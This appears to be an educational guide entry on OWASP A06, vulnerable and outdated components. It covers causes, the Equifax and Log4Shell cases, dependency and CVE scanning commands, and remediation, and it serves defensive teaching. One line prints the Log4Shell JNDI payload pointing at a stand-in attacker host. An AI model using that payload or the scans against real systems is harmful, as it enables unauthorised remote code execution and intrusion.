# A06 — Vulnerable and Outdated Components

**CVSS Range:** Up to 9.8 (Critical)
**CWE References:** CWE-1104

---

### What it is
Modern applications are built on layers of third-party libraries, frameworks, and components. When any of these contain known vulnerabilities (published CVEs), the application inherits those vulnerabilities. This includes direct dependencies and transitive dependencies (packages your packages use).

### Why it happens
- Development teams don't track what components are in use
- Updates are deprioritised when they "might break things"
- No automated alerting when a used component gets a new CVE
- Legacy systems that haven't been touched in years

### Real-world impact

```
Equifax breach (2017):
→ Cause: Unpatched Apache Struts (CVE-2017-5638)
→ Impact: 147 million people's personal data stolen
→ The patch was available 2 months before the breach

Log4Shell (2021) — CVE-2021-44228:
→ Cause: Log4j 2.x JNDI injection
→ Impact: Remote code execution on millions of servers
→ Payload: ${jndi:ldap://attacker.com/exploit}
→ Affected: Apple, Tesla, Minecraft, Amazon, and thousands more

WordPress plugin vulnerabilities:
→ Outdated plugins are the #1 source of WordPress compromises
→ Check: wpscan --url https://target.com --enumerate p
```

### How to test for it

```bash
# Identify technology versions from headers and pages
whatweb https://target.com
wappalyzer (browser extension)

# WordPress: scan for outdated plugins and themes
wpscan --url https://target.com --enumerate p,t,u

# Check JavaScript libraries for known CVEs
retire.js --path /path/to/js/files

# Dependency vulnerability scan (for source code access)
npm audit                     # Node.js
pip-audit                     # Python
mvn dependency-check:check    # Java (OWASP Dependency Check)
bundle audit                  # Ruby

# Search for CVEs manually
https://nvd.nist.gov/
https://www.cvedetails.com/

# Nuclei templates for CVE detection
nuclei -u https://target.com -t cves/
```

### Tools

| Tool | How to use it |
|---|---|
| `WPScan` | WordPress version, plugin, and theme vulnerability scanner |
| `retire.js` | Detect outdated and vulnerable JavaScript libraries |
| `OWASP Dependency-Check` | Scan project dependencies for known CVEs |
| `Snyk` | Developer-first dependency security scanning |
| `Nuclei` | CVE-specific detection templates |
| `Trivy` | Container and filesystem vulnerability scanner |
| `Dependabot` | GitHub automated dependency update PRs |

### How to fix it

- Maintain a **Software Bill of Materials (SBOM)** — an inventory of every component
- Subscribe to CVE feeds for components you use (NVD, vendor advisories)
- Automate dependency scanning in your CI/CD pipeline
- Set a policy for how quickly CVEs of each severity must be patched
- Remove unused dependencies — every extra package is an extra attack surface

---
